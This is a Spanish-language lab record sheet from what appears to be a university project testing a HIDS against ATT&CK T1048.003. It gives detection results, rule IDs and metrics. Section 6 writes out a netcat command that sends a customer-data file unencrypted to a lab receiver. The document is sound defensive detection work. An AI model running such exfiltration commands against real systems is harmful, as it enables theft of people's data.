---
fase: 3
bloque: fase-03-ampliacion-2
tanda: C
ata_id: ATA042
tecnica: T1048.003
tactica: Exfiltration
version: 1
status: cerrado
fecha: 2026-09-29
---

# Ficha — ATA042 · T1048.003 Unencrypted Non-C2 (`nc.openbsd`, TCP crudo) — Linux

> Bloque `fase-03-ampliacion-2` (**tanda C**, 4.º de 5). Generada por `tfg-executor`. **Sin secretos.**
> Estado **`cerrado`**: criterio **v2** → **`iguales`**. Métrica congelada (O1+O2).

## 1. Identificación

| Campo | Valor |
|---|---|
| ATA | **ATA042** |
| Técnica | **T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol** |
| Táctica | Exfiltration |
| Sistema | Linux (`victima-linux`, Ubuntu Server 24.04.5 LTS) |
| Vía | **manual / custom** |
| Ejecución | usuario `angel`, **sin `sudo`** |
| Capa del HIDS | **`execve`** (`nc.openbsd`) |

## 2. Fuente del ataque

| Campo | Valor |
|---|---|
| Fuente | `custom` (escrito por el TFG) |
| Herramienta | **`nc.openbsd`** (OpenBSD netcat 1.226) — TCP crudo, en claro |
| Efecto | envío **sin cifrar** del dato por TCP crudo al receptor |
| Elevación | **no** |
| Guardarraíl | destino **DEBE** ser `192.168.65.1:9091`; datos de juguete |

Artefacto: `.../T1048.003-Unencrypted_Non-C2/ATA042_ataque.sh`
(`sha256=ee9e427b29810e9385b06cf4b1210e11d8299bacca0989833302faa8c1f8e856`).
Señales: `.../ATA042_esperado.csv` (`sha256=54155a899adbbe1f3f991f1e84d447b44d4b9823a5213172e07d3c8d519ddf63`).
Validación humana: **APROBADO 2026-09-29**.
C0: `.../c0/ATA042_logtest.txt` (`sha256=a0e6a90ac9ceae3082f3d9be588befce9cf89044ab88bf602dd56c8326a76b8b`)
→ `ATA042_preflight.md` (`sha256=109e6c7619a3ce9074d5da277de8ea90f59c2386b779aacd71065f80c91fb770`) **PASA**
(1 evento `/usr/bin/nc.openbsd` → `80792` level 3; sin silenciador).

## 3. ⚠️ Binario real (lección del bloque)

`nc` es un **enlace** (`/etc/alternatives/nc`) → **`/usr/bin/nc.openbsd`**. El `execve` de `audit`
registra el **binario real** → el `esperado` declara **`audit_exe=nc.openbsd`** (no `nc`). *(Lección:
`audit_exe` con el nombre real o glob.)*

## 4. Snapshot, red y seguridad

Víctima revertida a **`lab-listo`** antes de cada iteración. **NAT off**. Receptor con **modo TCP**
(`--tcp-port 9091`) en el HOST, levantado antes de `t0` y parado tras `t1`.

## 5. Iteraciones

| Iter | t0 (UTC) | t1 (UTC) | Dur | snapshot |
|---|---|---|---|---|
| 1 | `2026-09-29T12:00:40Z` | `2026-09-29T12:01:12Z` | 32 s | `lab-listo` |
| 2 | `2026-09-29T12:03:21Z` | `2026-09-29T12:03:53Z` | 32 s | `lab-listo` |

## 6. Comando ejecutado (literal)

```bash
cd /home/angel/lab-attack/ATA042
bash ATA042_ataque.sh   # nc.openbsd -N -w 5 192.168.65.1 9091 < extracto_clientes_2026.txt
```

## 7. Evidencia

`Logs/ATA042_iter{1,2}/`: `times.log`, `ejecucion.out`, `deps.txt`, `sink.log`.

**Prueba de exfiltración — `sink.log` con sha256 idéntico al fichero EN CLARO enviado:**

| Iter | `sink.log` (`TCP … sha256=`) | sha256 enviado (`ejecucion.out`) |
|---|---|---|
| 1 | `69ae035970a4663b3a45bbe0c24adc33affa9b0feac41d7273260cf94520b854` | **idéntico** |
| 2 | `69ae035970a4663b3a45bbe0c24adc33affa9b0feac41d7273260cf94520b854` | **idéntico** |

(`sink.log` iter1 `sha256=fbb0f1af…`; iter2 `sha256=7c7bac7f…`.)

## 8. Ventana extraída

| Iter | `_raw` | victima-linux | Detalle |
|---|---|---|---|
| 1 | 1077 | 1070 | 1071 |
| 2 | 1094 | 1087 | 1088 |

## 9. Resultado

| Iter | filas | deteccion | auto_ruido | ruido_conocido | dudosa | artefacto_ataque | RS1 | RS2 | RS3 | RS4 |
|---|---|---|---|---|---|---|---|---|---|---|
| 1 | 1071 | **1** | 623 | 435 | **0** | 12 | 1 | 1070 | 0 | 0 |
| 2 | 1088 | **1** | 621 | 454 | **0** | 12 | 1 | 1087 | 0 | 0 |

### 9.1 Detecciones — desglose

| Iter | alertas | `rule_id` distintos | esperadas | sorpresas | primera evidencia |
|---|---|---|---|---|---|
| 1 | 1 | 1 · `{80792}` | **S1** | 0 | `12:00:42.245Z` `Audit: Command: /usr/bin/nc.openbsd` |
| 2 | 1 | 1 · `{80792}` | **S1** | 0 | `12:03:22.531Z` `Audit: Command: /usr/bin/nc.openbsd` |

- **`80792`** `Audit: Command: /usr/bin/nc.openbsd` (señal `S1`, anclado al `cwd`).
- **`dudosa` resueltas:** 1 PAM/iter → `ruido`. **0** filas del ataque en `ruido`.

### 9.2 Métrica de detección — **O1 + O2**

| Iter | O1 | `rule_id` | primera evidencia | O2 | desglose det/art/ruido | anexo |
|---|---|---|---|---|---|---|
| 1 | **sí** | `{80792}` | `12:00:42.245Z` `Audit: Command: /usr/bin/nc.openbsd` | **1/1** (`S1`) | 1 / 12 / 435 | 1 / 1 `rule_id` |
| 2 | **sí** | `{80792}` | `12:03:22.531Z` `Audit: Command: /usr/bin/nc.openbsd` | **1/1** (`S1`) | 1 / 12 / 454 | 1 / 1 `rule_id` |

## 10. Doble iteración (criterio **v2**) — veredicto **`iguales`**

- **C1′:** ✅ `{80792} == {80792}`. **C2′:** ✅ `|1−1|=0 ≤ 2`. **C3′:** ✅ sin dudosas (1 + 1). Ver
  `Bitacora/ATA042.json`.

## 11. Limitaciones y hallazgos

1. **El cifrado no cambia lo que ve el HIDS** (comparación con ATA019/ATA041): la detección es el
   **proceso**, no el contenido; aquí `nc.openbsd` (en claro), allí `openssl`+`cat`/`curl` (cifrado).
2. **Binario real:** declarar `nc.openbsd` (no `nc`) es **necesario** (si no, la fila baja a
   `artefacto`). Confirmado con el C0.
3. **TCP crudo:** `nc.openbsd -N` cierra el socket tras EOF → el receptor registra `len`+`sha256`.
